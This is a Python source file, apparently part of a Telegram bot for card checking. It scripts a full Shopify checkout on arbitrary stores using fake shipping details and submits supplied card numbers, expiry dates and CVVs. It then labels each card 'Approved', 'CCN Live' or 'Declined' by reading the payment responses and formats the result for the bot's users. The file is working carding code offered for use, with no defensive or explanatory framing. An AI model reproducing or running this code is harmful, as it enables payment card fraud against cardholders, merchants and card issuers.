from plugins.defs1 import buscarEnT
from urllib.parse import urlparse
import requests
import time
from faker import Faker
fake = Faker()

r = requests.Session()
def cart(product_link):
    r1 = r.get(product_link)
    varient_id = buscarEnT(r1.text, 'variantId":',',')
    if not r1 or not varient_id: return

    b_data = {
	"form_type": "product","utf8": "✓",
	"id": varient_id,"properties[_rc]": "9711",
	"properties[shipping_method]": "me",
	"properties[store_pickup]": "","quantity": "1"
}
    b_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }
    webname = urlparse(product_link).netloc
    r2 = r.post(f'https://{webname}/cart/add', headers =b_head,data =b_data)
    if not r2: return

    d_data = {
'updates[]': '1',
'checkout': 'Check Out'
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    r3 = r.post(f'https://{webname}/cart', headers=d_head, data=d_data)
    auth_token = buscarEnT(r3.text, 'type="hidden" name="authenticity_token" value="','"')
    if not r3 or not auth_token: return  
    checkout_url = r3.url
    return checkout_url, auth_token, webname

def checkout(cc, mes, año, cvv, checkout_url, auth_token, webname):
    email = fake.ascii_free_email()
    t1_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "contact_information",
	"step": "shipping_method",
	"checkout[email]": email,
	"checkout[buyer_accepts_marketing]": [
		"0",
		"1"
	],
	"checkout[shipping_address][first_name]": [
		"",
		"jose"
	],
	"checkout[shipping_address][last_name]": [
		"",
		"quiroz"
	],
	"checkout[shipping_address][company]": [
		"",
		""
	],
	"checkout[shipping_address][address1]": [
		"",
		"157+Allen+Street"
	],
	"checkout[shipping_address][address2]": [
		"",
		""
	],
	"checkout[shipping_address][city]": [
		"",
		"New+York"
	],
	"checkout[shipping_address][country]": [
		"",
		"United States"
	],
	"checkout[shipping_address][province]": [
		"",
		"NY"
	],
	"checkout[shipping_address][zip]": [
		"",
		"10009"
	],
	"checkout[shipping_address][phone]": [
		"",
		"(717)+123-1234"
	],
	"checkout[remember_me]": [
		"false",
		"0"
	],
	"checkout[buyer_accepts_sms]": "0",
	"checkout[sms_marketing_phone]": "",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "994",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t1 = r.post(checkout_url, data=t1_data)
    if not t1 or not "step=shipping_method" in t1.url: return
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": "shopify-Standard-0.00",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "994",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t = r.post(checkout_url, data=t_data)
    if not t: return 'Error al checkear'
    payment_gateway = buscarEnT(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscarEnT(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            print(t2.text)
            return
    nombre = str(fake.name())

    json_four = {"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": año},"payment_session_scope": webname}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return
    id = four.json()["id"] 
    #await m.reply(auth_token)
    #await m.reply(id)
    #await m.reply(gateway)

    dic = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "payment_method",
	"step": "",
	"s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[total_price]": "1000",
	"complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "664",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}

    f = r.post(checkout_url, data = dic)
    response_r1 = buscarEnT(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if "Thank you" in g.text: charge_Link = "Charged"
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: return
    texto = g.text
    return texto, charge_Link

def response(texto, charge_Link, saldo):
    response_error = buscarEnT(texto, 'class="notice__text">', "<")
    if response_error == None: response_error = ""
    r_logo, r_message, r_res = "❌", 'Declined', response_error
    if charge_Link == "Charged" and 'Thank you' in texto or 'Thank You For Your Order' in texto or 'Your order is confirmed' in texto: r_logo, r_message, r_res = "✅", "Approved", f"CHARGED ${saldo}"
    if "2010" in response_error or "Security code was not matched by the processor" in response_error: r_logo, r_message, r_res = "✅", "CCN Live", response_error # CCN Live
    if "Addres not Verified - Approved" in response_error or "Address not Verified - Approved" in response_error: r_logo, r_message, r_res = "✅", "Approved", response_error
    if "2001" in response_error or "Address not Verified - Insufficient Funds" in response_error or "Insufficient Funds" in response_error: r_logo, r_message, r_res = "✅", "Approved", response_error
    return r_logo, r_message, r_res

def texto(r_logo, r_message, r_res, nombre, taken, id, rangoC, complete, gate, bin, brand, type, level, bank, emojiCountry, country, currency):
    enviar = f' 𝐂𝐚𝐫𝐝: <code>{complete}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬: {r_message} {r_logo}\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {r_res}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}\n<b>------> 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 <------</b>\n𝐁𝐢𝐧: <code><i>{bin}</i></code>\n𝐁𝐢𝐧 𝐢𝐧𝐟𝐨: <code><i>{brand} - {type} - {level}</i></code>\n𝐁𝐚𝐧𝐤: <code><i>{bank}</i></code>\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} {emojiCountry}</code> - <code>{currency}</code>\n<b>------> 𝐈𝐧𝐟𝐨 <------</b>\n𝐓𝐢𝐦𝐞: {taken} 𝐒𝐞𝐠𝐬\n𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:  <a href="tg://user?id={id}">{nombre}</a> [<b>{rangoC}</b>]\n𝐎𝐰𝐧𝐞𝐫: <code><i>Draxxd30</i></code>'
    return enviar